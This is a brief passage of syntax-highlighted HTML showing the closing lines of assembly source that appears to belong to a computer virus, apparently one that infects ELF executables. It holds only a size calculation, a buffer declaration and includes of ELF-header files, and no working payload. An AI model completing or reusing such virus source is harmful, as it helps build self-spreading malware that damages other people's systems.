</span><span class="sc5">virus_size</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">.</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">

</span><span class="sc5">name_buffa</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">.skip</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc5">.include</span><span class="sc0"> </span><span class="sc3">"elf_head_buf.inc"</span><span class="sc0">
                        </span><span class="sc5">.include</span><span class="sc0"> </span><span class="sc3">"prg_head_buf.inc"</span><span class="sc0">
</span></div></body>
</html>
